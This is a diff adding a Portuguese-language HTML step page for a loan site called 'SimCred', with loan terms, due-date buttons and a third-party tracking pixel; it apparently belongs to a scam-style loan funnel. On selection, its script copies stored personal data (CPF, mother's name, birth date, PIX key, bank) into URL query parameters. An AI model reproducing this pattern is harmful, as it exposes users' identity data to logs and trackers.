@@ -1,0 +1,426 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/jquery-4.0.0.min.js"></script>
+  <script src="/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.pixelId = "69122e1651618c82cbe95013";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Escolha o Vencimento — SimCred</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
+
+    :root {
+      --navy: #042444;
+      --navy-light: #0a3a6e;
+      --green: #22C55E;
+      --green-dark: #16A34A;
+      --green-light: #DCFCE7;
+      --green-subtle: #F0FDF4;
+      --bg: #F4F5F7;
+      --card: #FFFFFF;
+      --text: #042444;
+      --text-mid: #1e3a5f;
+      --text-light: #6B7280;
+      --border: #E5E7EB;
+      --border-light: #F3F4F6;
+      --warning: #f59e0b;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+    }
+
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+
+    body{
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* =================== HEADER — SimCred navy =================== */
+    header.header{
+      background: var(--navy);
+      padding: 12px 0;
+      position: fixed;
+      top: 0; width: 100%; z-index: 1000;
+      box-shadow: 0 2px 12px rgba(4,36,68,0.3);
+    }
+    .header-content{
+      padding: 0 20px;
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; max-width: 550px; margin: 0 auto;
+    }
+    .header-left{ display: flex; align-items: center; gap: 14px; }
+    .menu-icon{
+      width: 40px; height: 40px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      cursor: pointer; border: 1px solid rgba(255,255,255,0.15); transition: all 0.2s ease;
+    }
+    .menu-icon:hover{ background: rgba(255,255,255,0.18); transform: scale(1.05); }
+    .menu-icon svg{ width: 18px; height: 18px; color: rgba(255,255,255,0.85); stroke-width: 2.5; }
+
+    .logo-wrap{ display: flex; align-items: center; text-decoration: none; }
+    .logo-img{ height: 38px; width: auto; object-fit: contain; display: block; }
+
+    .header-right{ display: flex; align-items: center; gap: 10px; }
+    .user-info{ display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
+    .user-name{ font-size:13px; font-weight:600; color:#fff; max-width:120px; text-overflow:ellipsis; overflow:hidden; white-space:nowrap; }
+    .user-cpf{ font-size:11px; color:rgba(255,255,255,0.55); letter-spacing:0.3px; }
+    .user-icon-wrapper{
+      width: 36px; height: 36px; background: rgba(34,197,94,0.2); border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      border: 2px solid var(--green); color:var(--green);
+    }
+    .user-icon-wrapper svg{ width: 18px; height: 18px; color: var(--green); }
+
+    /* MAIN */
+    .main-container{
+      flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
+    }
+    .container{
+      width: 100%; max-width: 550px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 32px 24px;
+      border: 1px solid var(--border);
+      animation: slideUp 0.6s ease-out;
+    }
+    @keyframes slideUp{
+      from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}
+    }
+
+    .section{display:none;}
+    .section.active{display:block;animation:fadeIn 0.4s ease-out;}
+    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+
+    .section-title{
+      font-family:'Outfit',sans-serif;
+      font-size: 1.4rem; font-weight: 800; color: var(--navy);
+      margin-bottom: 10px; text-align: center; letter-spacing: -0.3px;
+    }
+    .section-subtitle{
+      font-size: 0.95rem; color: var(--text-light);
+      margin-bottom: 24px; text-align: center; line-height: 1.6;
+    }
+    .user-greeting{ color: var(--green); font-weight: 700; }
+
+    /* INFO CARDS */
+    .info-card{
+      display: flex; align-items: center; gap: 14px;
+      background: #FAFBFC; border: 1.5px solid #E5E7EB;
+      border-radius: 12px; padding: 14px 16px; margin-bottom: 12px;
+    }
+    .info-icon{
+      width:40px; height:40px; min-width:40px;
+      background: linear-gradient(135deg, var(--navy), var(--navy-light));
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .info-icon svg{ width:20px; height:20px; color:white; }
+    .info-icon.warning{ background: var(--warning); }
+    .info-text{ font-size:0.85rem; color:var(--text-mid); font-weight:500; line-height:1.5; }
+    .info-highlight{ font-weight:700; color:var(--green-dark); }
+
+    .info-card.warning{
+      background: #fffbeb; border-color: rgba(245,158,11,0.3);
+    }
+    .info-card.warning .info-text{ color: #92400e; }
+    .info-card.warning .info-highlight{ color: #78350f; }
+
+    /* BUTTONS */
+    .btn-grid{ display: grid; gap: 12px; margin-top: 24px; }
+
+    .btn-primary{
+      width: 100%;
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      color: white; border: none;
+      padding: 16px 24px; border-radius: 12px;
+      font-size: 1rem; font-weight: 700; cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(34,197,94,0.3);
+      position: relative; overflow: hidden;
+    }
+    .btn-primary::before{
+      content:''; position:absolute; top:0; left:-100%;
+      width:100%; height:100%;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);
+      animation:shimmer 3s infinite;
+    }
+    @keyframes shimmer{0%{left:-100%;}100%{left:100%;}}
+    .btn-primary:hover{
+      transform:translateY(-2px);
+      box-shadow:0 6px 16px rgba(34,197,94,0.4);
+      filter: brightness(1.05);
+    }
+    .btn-primary:active{transform:translateY(0);}
+
+    .due-date-btn{
+      display: flex; align-items: center; justify-content: center;
+      gap: 12px; padding: 18px 24px;
+      background: #FAFBFC; border: 1.5px solid #E5E7EB;
+      color: var(--navy);
+      transition: all 0.25s ease;
+    }
+    .due-date-btn:hover{
+      border-color: var(--green);
+      background: var(--green-subtle);
+    }
+    .due-date-number{
+      font-size: 1.8rem; font-weight: 900; color: var(--green);
+    }
+    .due-date-text{
+      text-align: left; font-size: 0.9rem; line-height: 1.3; color: var(--text-mid);
+    }
+
+    /* LOADING */
+    .loading-overlay{
+      position:fixed; top:0; left:0; width:100%; height:100%;
+      background:rgba(0,0,0,0.7); display:none;
+      align-items:center; justify-content:center;
+      z-index:9999; backdrop-filter:blur(4px);
+    }
+    .loading-overlay.show{display:flex;}
+    .loading-content{
+      background:white; padding:40px; border-radius:16px;
+      text-align:center; max-width:300px;
+    }
+    .spinner{
+      width:60px; height:60px;
+      border:6px solid var(--green-light);
+      border-top:6px solid var(--green);
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin:0 auto 20px;
+    }
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .loading-text{ font-size:1.1rem; font-weight:600; color:var(--navy); }
+
+    /* =================== FOOTER — SimCred navy =================== */
+    footer.site-footer{
+      margin-top:auto; background: var(--navy); color:rgba(255,255,255,0.5);
+      padding:24px 20px; display:flex; align-items:center; justify-content:center;
+      text-align:center; border-top:1px solid rgba(255,255,255,0.08);
+    }
+    .footer-inner{
+      max-width:550px; width:100%;
+      display:flex; flex-direction:column; align-items:center; gap:10px;
+    }
+    .footer-logo{ display:flex; align-items:center; }
+    .footer-logo-img{ height: 36px; width:auto; object-fit:contain; display:block; filter:brightness(1.1); }
+    footer small{ font-size:11px; opacity:0.75; line-height:1.5; color:rgba(255,255,255,0.5); }
+    footer small strong{ color:var(--green); font-weight:600; }
+    .footer-badges{
+      display:flex; align-items:center; gap:16px; margin-top:4px;
+    }
+    .footer-badges span{
+      display:flex; align-items:center; gap:4px;
+      font-size:10px; color:rgba(255,255,255,0.4); font-weight:500;
+    }
+    .footer-badges svg{ width:12px; height:12px; color:rgba(255,255,255,0.4); }
+
+    @media (max-width: 600px){
+      .container{ padding: 24px 20px; }
+      .section-title{ font-size: 1.25rem; }
+      .due-date-number{ font-size: 1.6rem; }
+      .btn-primary{ padding: 15px 20px; font-size: 0.95rem; }
+      .info-card{ padding: 12px 14px; gap: 12px; }
+      .info-icon{ width:36px; height:36px; min-width:36px; }
+      .info-icon svg{ width:18px; height:18px; }
+      .info-text{ font-size: 0.8rem; }
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <a href="index.html" class="logo-wrap">
+          <img src="images/Sim-Cred.png" alt="SimCred" class="logo-img">
+        </a>
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="container">
+      <div id="aceite-secao" class="section active">
+        <h1 class="section-title">Condições do Empréstimo</h1>
+        <p class="section-subtitle">Leia atentamente antes de prosseguir</p>
+
+        <div class="info-card">
+          <div class="info-icon">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+            </svg>
+          </div>
+          <p class="info-text">
+            Se houver atraso no pagamento das parcelas, serão aplicados juros de <span class="info-highlight">0,49% ao mês</span>.
+          </p>
+        </div>
+
+        <div class="info-card warning">
+          <div class="info-icon warning">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+            </svg>
+          </div>
+          <p class="info-text">
+            <span class="info-highlight">Importante:</span> O pagamento em dia evita juros e mantém seu crédito saudável.
+          </p>
+        </div>
+
+        <div class="btn-grid">
+          <button class="btn-primary" onclick="proximaSecao()">
+            Li e Concordo
+          </button>
+        </div>
+      </div>
+
+      <div id="vencimento-secao" class="section">
+        <h1 class="section-title">
+          Ótimo, <span class="user-greeting" id="nomeGreeting">Cliente</span>!
+        </h1>
+        <p class="section-subtitle">Agora escolha o melhor dia para o vencimento das suas parcelas</p>
+
+        <div class="btn-grid">
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(5)">
+            <span class="due-date-number">05</span>
+            <span class="due-date-text"><strong>Dia 05</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(10)">
+            <span class="due-date-number">10</span>
+            <span class="due-date-text"><strong>Dia 10</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(15)">
+            <span class="due-date-number">15</span>
+            <span class="due-date-text"><strong>Dia 15</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(25)">
+            <span class="due-date-number">25</span>
+            <span class="due-date-text"><strong>Dia 25</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(30)">
+            <span class="due-date-number">30</span>
+            <span class="due-date-text"><strong>Dia 30</strong><br>Todo mês</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <p class="loading-text">Processando sua escolha...</p>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img src="/images/Sim-Cred.png" alt="SimCred" class="footer-logo-img">
+      </div>
+      <small><strong>SimCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+      <div class="footer-badges">
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+          SSL Seguro
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+          Dados protegidos
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>
+          Instituição regulada
+        </span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const primeiroNome = nomes[0];
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${primeiroNome} ${ultimoNome}` : primeiroNome;
+        document.getElementById('nomeGreeting').textContent = primeiroNome;
+      }
+      
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', loadUserData);
+
+    function proximaSecao() {
+      document.getElementById('aceite-secao').classList.remove('active');
+      document.getElementById('vencimento-secao').classList.add('active');
+    }
+
+    function selectDueDate(day) {
+      document.getElementById('loadingOverlay').classList.add('show');
+      localStorage.setItem('dueDate', day.toString());
+      
+      const urlParams = new URLSearchParams(window.location.search);
+      urlParams.set('dueDate', day);
+      
+      const importantParams = [
+        'income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign', 
+        'utm_medium', 'utm_content', 'utm_term', 'name', 'email', 'document', 'nome_mae', 
+        'data_nasc', 'telephone', 'telefone', 'cpf', 'nome', 'banco', 'chave_pix',
+        'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment'
+      ];
+      
+      importantParams.forEach(param => {
+        const value = localStorage.getItem(param);
+        if (value && !urlParams.has(param)) {
+          urlParams.set(param, value);
+        }
+      });
+      
+      const finalParams = urlParams.toString();
+      const targetUrl = finalParams ? `/8?${finalParams}` : '/8';
+      
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 1500);
+    }
+  </script>
+
+</body></html>
